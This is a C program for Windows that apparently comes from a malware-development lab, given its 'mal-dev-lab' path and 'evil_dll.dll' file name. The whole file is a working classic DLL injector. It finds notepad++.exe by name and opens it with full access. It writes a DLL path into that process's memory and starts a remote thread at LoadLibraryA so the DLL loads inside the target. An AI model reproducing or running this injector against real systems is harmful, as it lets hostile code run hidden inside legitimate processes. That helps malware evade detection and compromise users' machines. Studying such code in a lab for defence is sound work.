#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

DWORD GetPIDByName(const char *procName) {
    DWORD pid = 0;
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) {
        return 0;
    }

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(PROCESSENTRY32);

    if (Process32First(hSnapshot, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, procName) == 0) { // comparar sin mayúsc/minúsc
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &pe));
    }

    CloseHandle(hSnapshot);
    return pid;
}


int main() {
    const char *dll_path = "C:\\Users\\test\\Desktop\\mal-dev-lab\\dlls\\injection\\evil_dll.dll";
    const char *target = "notepad++.exe";

    DWORD pid = GetPIDByName(target);
    if (pid) {
        printf("PID de %s: %lu\n", target, pid);
    } else {
        printf("Proceso %s no encontrado.\n", target);
    }

    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (hProcess == NULL) {
        printf("Failed to retrieve handle to remote process: %d\n", GetLastError());
        return 1;
    }
    printf("Handle to %s: %p\n", target, hProcess);

    LPVOID allocated_mem = VirtualAllocEx(hProcess, NULL, strlen(dll_path) + 1, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocated_mem == NULL) {
        printf("Failed to allocate memory in remote process: %d\n", GetLastError());
        return 1;
    }
    printf("Memory allocated at: %p\n", allocated_mem);
    
    WriteProcessMemory(hProcess, allocated_mem, dll_path, strlen(dll_path) + 1, NULL);

    HMODULE kernel32Base = GetModuleHandleW(L"kernel32.dll");
    if (kernel32Base == NULL) {
        printf("Failed to retrieve handle to kernel32.dll: %d\n", GetLastError());
        return 1;
    }
    printf("kernel32Base: %p\n", kernel32Base);


    FARPROC load_library_address = GetProcAddress(kernel32Base, "LoadLibraryA");

    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)load_library_address, allocated_mem, 0, NULL);
    if (hThread == NULL) {
        printf("Failed to create thread in remote process: %d\n", GetLastError());
        return 1;
    }

    WaitForSingleObject(hThread, INFINITE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}